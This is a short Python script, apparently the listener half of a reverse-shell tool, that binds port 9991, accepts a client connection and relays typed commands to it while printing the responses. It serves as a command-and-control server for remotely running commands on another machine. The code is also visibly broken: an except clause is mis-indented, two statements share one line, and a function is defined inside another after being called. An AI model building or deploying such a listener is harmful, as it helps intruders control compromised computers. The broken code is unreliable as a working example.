import socket 
import sys 
#Create a Socket ( connect two computers) 
def create_sockets(): 
    try: 
        global host 
        global port 
        global s 
        host = "" 
        port = 9991 
        s = socket.socket() 
        except socket.error as msg: 
            print("Socket creation failed" + str(msg)) 
#Binding the socket and listening for connections 
def bind_socket(): 
    try: 
        global host 
        global port 
        global s 
        print("Binding the port: " + str(port)) 
        s.bind((host,port)) s.listen(5) 
    except socket.error as msg: 
        print("socket binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket() 
#Accepting or establising the connection with a client 
def socket_accept(): 
    conn,address = s.accept() 
    print("connection has been established!" + "IP" + address[0] + " | Port" + str(address[1])) 
    send_commands(conn) 
    conn.close() 
    def send_commands(conn): 
        while True: 
            cmd = input() 
            if cmd == 'quit': 
                conn.close() 
                s.close()
                sys.exit() 
            if len(str.encode(cmd)) > 0: 
                conn.send(str.encode(cmd)) 
                client_response = str(conn.recv(1024), "utf-8") 
                print(client_response, end="") 
def main(): 
    create_sockets() 
    bind_socket() 
    socket_accept() 
    
main()